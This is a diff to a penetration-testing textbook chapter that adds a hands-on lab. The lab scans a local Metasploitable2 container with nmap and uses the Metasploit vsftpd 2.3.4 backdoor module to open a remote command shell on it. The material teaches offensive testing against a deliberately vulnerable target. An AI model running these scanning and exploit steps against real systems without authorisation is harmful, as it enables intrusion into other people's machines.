@@ -329,8 +329,85 @@ Many password systems mitigate online password brute force attacks by putting a 
 #### Service Exploitation
 Most services are reasonably secure and only allow for the functionality of the service without enabling remote access to the underlying system.  However, it isn't uncommon for a service to have a vulnerability discovered that allows arbitrary code or command execution that leads to a complete system compromise.  This happens so often that regular patch management is a must for network exposed services.  Take the example of the Vsftpd service running version 2.3.4 in the scenario provided in the previous section where a remote code execution exploit was listed on ExploitDB.  This service is absolutely discoverable by a tester and could reasonably be exploited to gain initial access.  To avoid this type of exploitation, it is important for defenders and administrators to ensure a strong patch management process while limiting the attack surface of exposed systems.
 
->[activity] Activity 10.4 - Metasploitable2
+>[!activity] Activity 10.4 - Metasploitable2
 >So far in this chapter we have explored Metasploit, reverse shells, and the testing process.  These skills can be practiced on the vulnerable by design Metasploitable2 docker image.  This image has many services and a web application that has many common vulnerabilities.  The goal of the system is to practice identifying and exploiting vulnerabilities and will make as a great proxy to perform a mock penetration test against.
+>
+>After launching the Kali VM and starting a terminal, I download and run the Metasploitable2 image in the background with the following command.  
+>```bash
+>docker run -it --name "metasploitable2" tleemcjr/metasploitable2 sh -c "bin/services.sh && bash" &
+>```
+>![[../images/10/pentest_activity_metasploitable.png|Running Metasploitable2 On Kali|600]]
+>This action requires Docker to be installed and my current user added to the Docker group.  Both prerequisites were accomplished during previous activities.  Here are the commands that were previously used for reference.
+>```bash
+>sudo apt update -y
+>sudo apt install -y docker.io
+>sudo usermod -aG docker $USER
+>reboot
+>```
+>After a minute the Metasploitable container should be running which I confirm by listing all running containers.
+>```bash
+>docker container ls
+>```
+>![[../images/10/pentest_activity_container_list.png|Confirming Container Running|600]]
+>Now that the Metasploitable container appears to be running, I am ready to begin my enumeration efforts.  First I need to discover the network Docker is running on within my Kali host.  Listing the interfaces on the machine shows a virtual interface called `docker0` that shows the Kali host's Docker network is on the 172.17.0.1/16 network.  This means that both the Kali VM and the Metasploitable container are part of the same virtual network.
+>```bash
+>ip a
+>```
+>![[../images/10/pentest_activity_interfaces.png|Kali Docker Network Check|600]]
+>With the network identified, I use NMAP to perform a ping sweep and identify the Metasploitable target IP address.  After running the command, NMAP starts to blindly ping every IP address in the /16 network and finds 172.17.0.2 within a few minutes.
+>```bash
+>sudo nmap -sn 172.17.0.1/16
+>```
+>![[../images/10/pentest_activity_ping_sweep.png|Ping Sweep Docker Network To Find Target|600]]
+>My next step is to enumerate the services and versions on the Metasploitable target at 172.17.0.2.  I run NMAP again specifying TCP and version scans against the target.  I leave the default top 1000 ports to check, but could perform a more thorough scan with the option `-p-`.  However, even the top 1000 ports check identifies many interesting services!
+>```bash
+>sudo nmap -sT -sV 172.17.0.2
+>```
+>![[../images/10/pentest_activity_services.png|NMAP Service Scan On Metasploitable|600]]
+>There are many potential targets to further enumerate.  The first one that catches my eye is port 21 Vsftpd version 2.3.4.  You may recall this software version was explored on ExploitDB and could contain a remote code execution Metasploit exploit.  I start Metasploit to begin my exploitation phase of the penetration test.
+>```bash
+>sudo msfdb run
+>```
+>![[../images/10/pentest_activity_metasploit_start.png|Starting Metasploit on Kali|600]]
+>Once Metasploit starts I search for useful modules related to Vsftpd.
+>```bash
+>search vsftpd
+>```
+>![[../images/10/pentest_activity_search.png|Searching Vsftpd Modules In Metasploit|600]]
+>The second module looks promising as it has an excellent rank and suggests its a remote command execution module for Vsftpd 2.3.4.  I select the module with the `use` command then display the options related to the it.
+>```bash
+>use exploit/unix/ftp/vstfpd_234_backdoor
+>```
+>![[../images/10/pentest_activity_use_exploit.png|Select Exploit and Display Configuration Options|600]]
+>Looks like I need to set RHOSTS as it is required.  I could change the payload but the default one should work well.  I set RHOSTS to the target IP 172.17.0.2 and then run the exploit.
+>```
+>set RHOSTS 172.17.0.2
+>run
+>```
+>![[../images/10/pentest_activity_exploit.png|Running Exploit Against Target|600]]
+>Almost immediately I receive positive log messages and then about 30 seconds later another output message suggests a command shell session 1 was opened and I am returned to the Metasploit command line.  Entering the sessions command reveals an active and open session related to the exploit.
+>```
+>sessions
+>```
+>![[../images/10/pentest_activity_session.png|Listing Metasploit Sessions|600]]
+>The session listed was generated from the exploit.  It represents a connection my Kali host has to the Metasploitable victim container.  I jump into the session's terminal using the session command but this time specifying the session ID 1.
+>```
+>sessions 1
+>```
+>![[../images/10/pentest_activity_interactive_session.png|Entering Interactive Session 1|600]]
+>The interactive session is started and I am left with a blank command line.  I try the following commands which return standard output from the victim!  I now have a remote terminal on the victim from the Vsftpd exploit.
+>```bash
+>whoami
+>uname -a
+>ip a
+>```
+>![[../images/10/pentest_activity_rce_terminal.png|Command Terminal On Victim|600]]
+>I can hop out of the interactive session and return to Metasploit with the `background` command while answering yes.  Afterwards I can access the session again using the session command.
+>```
+>background
+>y
+>```
+>![[../images/10/pentest_activity_background.png|Background Interactive Session]]
 
 ### Post Exploitation
 The tactics performed after initial access are called post exploitation and consist of persistence, pillaging, privilege escalation, and pivoting.  Persistence and privilege escalation tools and techniques were covered in detail within the Persistence and Privilege Escalation chapter.  After persistence is established by the tester, they will being pillage efforts to gather inside information from the compromised device.  The tester will perform system specific information gathering to learn as much as they can about the now compromised system.  This information may include the software that is installed on it, who uses the system, what processes, services and jobs run on it, and what other devices in the network it might be connected to.  Further pillaging efforts seek to collect credentials from the system's trust stores, security systems, applications, and browsers.
